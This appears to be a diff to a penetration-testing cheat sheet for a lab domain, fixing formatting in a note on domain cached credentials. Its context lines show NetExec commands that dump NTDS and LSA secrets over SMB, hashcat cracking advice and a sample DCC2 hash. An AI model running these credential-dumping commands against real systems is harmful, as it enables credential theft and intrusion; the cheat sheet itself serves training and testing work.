@@ -415,7 +415,7 @@ nxc smb [$IP] -u [user] -p [password] --ntds
 ```bash
 nxc smb [$IP] -u [user] -p [password] --lsa
 ```
-> `$DCC2$ are domain cached credentials. DCC cannot be used for PTH. For cracking, grab the part after `$DCC2$`, and use hashcat module 2100.  
+> `$DCC2$` are domain cached credentials. DCC cannot be used for PTH. For cracking, grab the part after `$DCC2$`, and use hashcat module 2100.  
 ```bash
 # Example
 INLANEFREIGHT.HTB/julio:$DCC2$10240#julio#c2139497f24725b345aa1e23352481f3
